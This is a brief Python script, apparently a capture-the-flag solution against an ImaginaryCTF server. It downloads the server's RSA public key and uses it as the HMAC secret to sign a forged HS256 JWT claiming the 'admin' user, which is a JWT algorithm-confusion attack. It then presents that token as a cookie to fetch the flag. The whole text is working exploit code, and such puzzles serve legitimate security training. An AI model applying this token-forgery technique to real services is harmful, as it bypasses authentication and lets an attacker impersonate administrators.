from requests import get
import jwt # requires pyjwt==2.0.0

url = "http://puzzler7.imaginaryctf.org:11007"

public_key = get(url + "/pubkey").text
token = jwt.encode({"user": "admin"}, public_key, "HS256")
print(get(url+"/flag", cookies={"token": token}).text)